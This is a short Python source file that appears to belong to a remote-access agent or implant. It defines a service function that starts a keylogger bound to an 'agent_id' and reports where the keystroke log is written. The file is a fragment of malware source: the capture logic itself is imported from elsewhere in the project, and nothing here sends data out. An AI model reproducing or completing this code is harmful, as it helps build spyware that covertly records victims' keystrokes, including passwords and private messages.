from config.settings import KEYLOG_FILE
from actions.keylogger import start_keylogger

def start_keylogger_service(agent_id):
    """Start the key logger service in a background thread."""
    try:
        if agent_id is None:
            print("[!] No agent ID found. Key logger will not start.")
            return
        
        listener = start_keylogger(agent_id)

        if listener is None:
            print("[!] Key logger disabled.")
        else:
            print(f"[+] Key logger running → {KEYLOG_FILE}")

    except Exception as e:
        print(f"[!] Key logger error: {e}")